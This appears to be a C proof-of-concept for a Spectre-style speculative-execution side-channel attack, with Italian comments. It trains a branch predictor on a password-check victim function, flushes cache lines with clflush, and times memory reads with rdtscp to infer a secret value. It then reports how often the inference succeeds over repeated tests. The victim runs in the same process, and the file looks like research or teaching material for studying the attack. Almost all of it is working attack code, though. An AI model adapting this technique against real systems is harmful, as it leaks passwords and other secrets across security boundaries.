/*
 *  Created on: 02 lug 2018
 *      Author: Marco Buracchi
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>

#ifdef _MSC_VER
#include <intrin.h> 
#pragma optimize("gt",on)
#else
#include <x86intrin.h> 
#endif

/********** Codice vittima **********/
#define SIZE 3000

uint8_t unused1[64];
unsigned int secret[SIZE];
uint8_t unused2[64];
unsigned int array1[SIZE];
uint8_t unused3[64];
unsigned int passwordDigest[SIZE];

uint8_t temp = 0; /* Non fa ottimizzare al compilatore la funzione victim_function() */

void victim_function(int userID, int pwd) {
	if (pwd == passwordDigest[userID]) {
		temp &= array1[secret[userID]];
	}
}

/********** Main **********/

int main(int argn, char *argv[]) {

#define CACHELINE 512

	if (argn - 1 != 4) {
		printf(
				"Numero inesatto di argomenti (#round #test #threshold precisione\n");
		exit(1);
	}

	// parametri
	int numberOfRuns = strtol(argv[1], NULL, 10);
	int numberOfTest = strtol(argv[2], NULL, 10);
	int cacheHitThreshold = strtol(argv[3], NULL, 10);
	int precisionLoss = strtol(argv[4], NULL, 10);

	int blocks = sizeof(array1[0]) * 8;
	int delta = CACHELINE / blocks;
	int class = SIZE / delta + 1;

	// contatori
	int ok = 0;
	int error = 0;
	int noHit = 0;

	int results[class];

	unsigned int timeReg;
	register uint64_t time1, time2;

	srand(time(NULL));

	for (int t = 1; t <= numberOfTest; t++) {

		printf("Test %d di %d\n", t, numberOfTest);

		int userUnderAttack = rand() % SIZE;

		for (int i = 0; i < SIZE; i++) {
			passwordDigest[i] = rand() % SIZE;
			array1[i] = rand() % SIZE;
			secret[i] = rand() % SIZE;
		}

		for (int i = 0; i < class; i++) {
			results[i] = 0;
		}

		for (int j = 0; j < numberOfRuns; j++) {

			for (int l = 1; l <= class; l++) {

				for (int i = 1; i < 10; i++) {
					victim_function(1, passwordDigest[1]);
				}

				for (int i = 0; i < SIZE; i++) {
					_mm_clflush(&array1[i]);
					_mm_clflush(&passwordDigest[i]);
				}

				for (volatile int z = 0; z < 100; z++) {
				}

				victim_function(userUnderAttack, 1);

				for (volatile int z = 0; z < 100; z++) {
				}

				time1 = __rdtscp(&timeReg);
				timeReg = array1[l * delta];
				time2 = __rdtscp(&timeReg) - time1;

				for (volatile int z = 0; z < 100; z++) {
				}

				if ((int) time2 <= cacheHitThreshold) {
					results[l]++;
				}
			}
		}

		int max = -1;
		int index = -1;
		for (int i = 0; i < class; i++) {
			if (results[i] >= max) {
				max = results[i];
				index = i;
			}
		}

		int rangeMax =
				((index + 1) * delta + (precisionLoss * delta) >= SIZE) ?
						SIZE : (index + 1) * delta + (precisionLoss * delta);
		int rangeMin =
				((index - 1) * delta - (precisionLoss * delta) <= 0) ?
						0 : (index - 1) * delta - (precisionLoss * delta);

		if (results[index] > 0 && rangeMin <= secret[userUnderAttack]
				&& rangeMax >= secret[userUnderAttack]) {
			printf("OK: predizione tra %d e %d, segreto = %d\n", rangeMin,
					rangeMax, secret[userUnderAttack]);
			ok++;
		} else if (results[index] == 0) {
			printf("***** NO-HIT: nessuna hit rilevata in %d tentativi *****\n",
					numberOfRuns);
			noHit++;
		} else {
			printf("***** ERROR: predizione tra %d e %d, segreto = %d *****\n",
					rangeMin, rangeMax, secret[userUnderAttack]);
			error++;
		}
	}

	printf("***TOTALI***\nOK -> %d\nNO-HIT -> %d\nERROR -> %d\n", ok, noHit,
			error);

	return (0);
}
